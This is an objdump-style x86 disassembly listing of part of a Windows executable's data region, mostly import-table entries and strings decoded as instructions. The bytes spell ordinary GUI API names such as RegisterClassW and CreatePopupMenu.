  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc7],cl
  412441:	sub    eax,0x3
  412446:	add    BYTE PTR [eax],al
  412448:	add    BYTE PTR [eax],al
  41244a:	add    BYTE PTR [eax],al
  41244c:	jmp    0x0:0x4d49a9
  412453:	add    BYTE PTR [edx+0x24],bh
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
